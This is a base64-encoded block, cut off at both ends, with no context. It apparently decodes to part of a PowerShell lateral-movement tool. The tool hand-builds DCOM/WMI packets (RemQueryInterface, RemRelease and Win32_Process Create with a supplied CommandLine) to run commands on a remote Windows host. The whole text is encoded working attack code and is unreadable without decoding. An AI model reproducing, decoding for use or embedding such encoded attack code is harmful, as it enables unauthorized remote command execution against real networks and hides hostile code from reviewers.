CAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX25hbWVzcGFjZV91bmljb2RlICs9IDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfbmFtZXNwYWNlX3VuaWNvZGUgKz0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9kYXRhID0gMHgwNSwweDAwLDB4MDcsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhdXNhbGl0eV9JRF9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9uYW1lc3BhY2VfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9uYW1lc3BhY2VfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfbmFtZXNwYWNlX3VuaWNvZGUgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNCwweDAwLDB4MDIsMHgwMCwweDA5LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NjUsMHgwMCwweDZlLDB4MDAsMHgyZCwweDAwLDB4NTUsMHgwMCwweDUzLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDJjLDB4MDAsMHg2NSwweDAwLDB4NmUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VxdWVuY2VfbnVtYmVyID0gMHgwNCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfYXV0aF9wYWRkaW5nID0gOA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwNiwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgwNSwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkb2JqZWN0X1VVSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2RhdGEgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfY2xpZW50X3JlY2VpdmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfZGF0YSA9ICRXTUlfZGF0YSAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9YSURfaW5kZXggPSAkV01JX2RhdGEuSW5kZXhPZigkT1hJRCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9YSURfYnl0ZXNfaW5kZXggPSAkT1hJRF9pbmRleCAvIDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElQSUQyID0gJFdNSV9jbGllbnRfcmVjZWl2ZVsoJE9YSURfYnl0ZXNfaW5kZXggKyAxNikuLigkT1hJRF9ieXRlc19pbmRleCArIDMxKV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9yZW1fcmVsZWFzZSA9IEdldC1QYWNrZXREQ09NUmVtUmVsZWFzZSAkY2F1c2FsaXR5X0lEX2J5dGVzICRvYmplY3RfVVVJRDIgJElQSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfcmVtX3JlbGVhc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VxdWVuY2VfbnVtYmVyID0gMHgwNSwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfYXV0aF9wYWRkaW5nID0gNA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwNywweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgwMywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkb2JqZWN0X1VVSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X3JlbV9xdWVyeV9pbnRlcmZhY2UgPSBHZXQtUGFja2V0RENPTVJlbVF1ZXJ5SW50ZXJmYWNlICRjYXVzYWxpdHlfSURfYnl0ZXMgJElQSUQyIDB4OWUsMHhjMSwweGZjLDB4YzMsMHg3MCwweGE5LDB4ZDIsMHgxMSwweDhiLDB4NWEsMHgwMCwweGEwLDB4YzksMHhiNywweGM5LDB4YzQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfcmVtX3F1ZXJ5X2ludGVyZmFjZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXF1ZW5jZV9udW1iZXIgPSAweDA2LDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2ZsYWdzID0gMHg4Mw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9hdXRoX3BhZGRpbmcgPSA0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2NhbGxfSUQgPSAweDA4LDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2NvbnRleHRfSUQgPSAweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3Rfb3BudW0gPSAweDAzLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfVVVJRCA9ICRvYmplY3RfVVVJRA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ0FsdGVyQ29udGV4dCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9yZW1fcXVlcnlfaW50ZXJmYWNlID0gR2V0LVBhY2tldERDT01SZW1RdWVyeUludGVyZmFjZSAkY2F1c2FsaXR5X0lEX2J5dGVzICRJUElEMiAweDgzLDB4YjIsMHg5NiwweGIxLDB4YjQsMHhiYSwweDFhLDB4MTAsMHhiNiwweDljLDB4MDAsMHhhYSwweDAwLDB4MzQsMHgxZCwweDA3DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X3JlbV9xdWVyeV9pbnRlcmZhY2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA2DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VxdWVuY2VfbnVtYmVyID0gMHgwNywweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfYXV0aF9wYWRkaW5nID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwOSwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwNCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgwNiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkSVBJRDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2RhdGEgPSAweDA1LDB4MDAsMHgwNywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2F1c2FsaXR5X0lEX2J5dGVzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg1NSwweDczLDB4NjUsMHg3MiwweDBkLDB4MDAsMHgwMCwweDAwLDB4MWEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDBkLDB4MDAsMHgwMCwweDAwLDB4NzcsMHgwMCwweDY5LDB4MDAsMHg2ZSwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzMywweDAwLDB4MzIsMHgwMCwweDVmLDB4MDAsMHg3MCwweDAwLDB4NzIsMHgwMCwweDZmLDB4MDAsMHg2MywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg2NSwweDAwLDB4NzMsMHgwMCwweDczLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXF1ZW5jZV9udW1iZXIgPSAweDA4LDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2ZsYWdzID0gMHg4Mw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9hdXRoX3BhZGRpbmcgPSAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2NhbGxfSUQgPSAweDEwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2NvbnRleHRfSUQgPSAweDA0LDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3Rfb3BudW0gPSAweDA2LDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfVVVJRCA9ICRJUElEMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1JlcXVlc3QnDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfZGF0YSA9IDB4MDUsMHgwMCwweDA3LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYXVzYWxpdHlfSURfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDU1LDB4NzMsMHg2NSwweDcyLDB4MGQsMHgwMCwweDAwLDB4MDAsMHgxYSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MGQsMHgwMCwweDAwLDB4MDAsMHg3NywweDAwLDB4NjksMHgwMCwweDZlLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDMzLDB4MDAsMHgzMiwweDAwLDB4NWYsMHgwMCwweDcwLDB4MDAsMHg3MiwweDAwLDB4NmYsMHgwMCwweDYzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDY1LDB4MDAsMHg3MywweDAwLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyRfIC1nZSA4fQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcXVlbmNlX251bWJlciA9IDB4MDksMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfYXV0aF9wYWRkaW5nID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwYiwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwNCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgxOCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkSVBJRDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kc3R1Yl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRDb21tYW5kLkxlbmd0aCArIDE3NjkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2xlbmd0aCA9ICRzdHViX2xlbmd0aFswLDFdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJHN0dWJfbGVuZ3RoMiA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJENvbW1hbmQuTGVuZ3RoICsgMTcyNykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfbGVuZ3RoMiA9ICRzdHViX2xlbmd0aDJbMCwxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRzdHViX2xlbmd0aDMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRDb21tYW5kLkxlbmd0aCArIDE3MTMpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2xlbmd0aDMgPSAkc3R1Yl9sZW5ndGgzWzAsMV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kY29tbWFuZF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRDb21tYW5kLkxlbmd0aCArIDkzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZF9sZW5ndGggPSAkY29tbWFuZF9sZW5ndGhbMCwxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRjb21tYW5kX2xlbmd0aDIgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRDb21tYW5kLkxlbmd0aCArIDE2KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZF9sZW5ndGgyID0gJGNvbW1hbmRfbGVuZ3RoMlswLDFdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJGNvbW1hbmRfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRDb21tYW5kKQ0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB0aGFua3MgdG8gQHZ5c2VjIGZvciBmaW5kaW5nIGEgYnVnIHdpdGggY2VydGFpbiBjb21tYW5kIGxlbmd0aHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1N0cmluZ10kY29tbWFuZF9wYWRkaW5nX2NoZWNrID0gJENvbW1hbmQuTGVuZ3RoIC8gNA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGNvbW1hbmRfcGFkZGluZ19jaGVjayAtbGlrZSAiKi43NSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kX2J5dGVzICs9IDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJGNvbW1hbmRfcGFkZGluZ19jaGVjayAtbGlrZSAiKi41IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmRfYnl0ZXMgKz0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRjb21tYW5kX3BhZGRpbmdfY2hlY2sgLWxpa2UgIiouMjUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZF9ieXRlcyArPSAweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmRfYnl0ZXMgKz0gMHgwMCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9kYXRhID0gMHgwNSwweDAwLDB4MDcsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhdXNhbGl0eV9JRF9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4NTUsMHg3MywweDY1LDB4NzIsMHgwZCwweDAwLDB4MDAsMHgwMCwweDFhLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwZCwweDAwLDB4MDAsMHgwMCwweDU3LDB4MDAsMHg2OSwweDAwLDB4NmUsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzMsMHgwMCwweDMyLDB4MDAsMHg1ZiwweDAwLDB4NTAsMHgwMCwweDcyLDB4MDAsMHg2ZiwweDAwLDB4NjMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NjUsMHgwMCwweDczLDB4MDAsMHg3MywweDAwLDB4MDAsMHgwMCwweDU1LDB4NzMsMHg2NSwweDcyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNiwweDAwLDB4MDAsMHgwMCwweDBjLDB4MDAsMHgwMCwweDAwLDB4MDYsMHgwMCwweDAwLDB4MDAsMHg2MywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg3MiwweDAwLDB4NjUsMHgwMCwweDYxLDB4MDAsMHg3NCwweDAwLDB4NjUsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMiwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDRkLDB4NDUsMHg0ZiwweDU3LDB4MDQsMHgwMCwweDAwLDB4MDAsMHg4MSwweGE2LDB4MTIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGRjLDB4N2YsMHg3MywweGNmLDB4MTEsMHg4OCwweDRkLDB4MDAsMHhhYSwweDAwLDB4NGIsMHgyZSwweDI0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxMiwweGY4LDB4OTAsMHg0NSwweDNhLDB4MWQsMHhkMCwweDExLDB4ODksMHgxZiwweDAwLDB4YWEsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NGIsMHgyZSwweDI0LDB4MDAsMHgwMCwweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfbGVuZ3RoMiArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHg3OCwweDU2LDB4MzQsMHgxMiArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9sZW5ndGgzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAyLDB4NTMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA2LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwZCwweDAwLDB4MDAsMHgwMCwweDA0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwZiwweDAwLDB4MDAsMHgwMCwweDBlLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAzLDB4MDAsMHgwMCwweDAwLDB4MmEsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE1LDB4MDEsMHgwMCwweDAwLDB4NzMsMHgwMSwweDAwLDB4MDAsMHg3NiwweDAyLDB4MDAsMHgwMCwweGQ0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMiwweDAwLDB4MDAsMHhiMSwweDAzLDB4MDAsMHgwMCwweDE1LDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHhmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgxMiwweDA0LDB4MDAsMHg4MCwweDAwLDB4NWYsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDVmLDB4NTAsMHg0MSwweDUyLDB4NDEsMHg0ZCwweDQ1LDB4NTQsMHg0NSwweDUyLDB4NTMsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MSwweDYyLDB4NzMsMHg3NCwweDcyLDB4NjEsMHg2MywweDc0LDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHg0MywweDZmLDB4NmQsMHg2ZCwweDYxLDB4NmUsMHg2NCwweDRjLDB4NjksMHg2ZSwweDY1LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4NzMsMHg3NCwweDcyLDB4NjksMHg2ZSwweDY3LDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxMSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MGEsMHgwM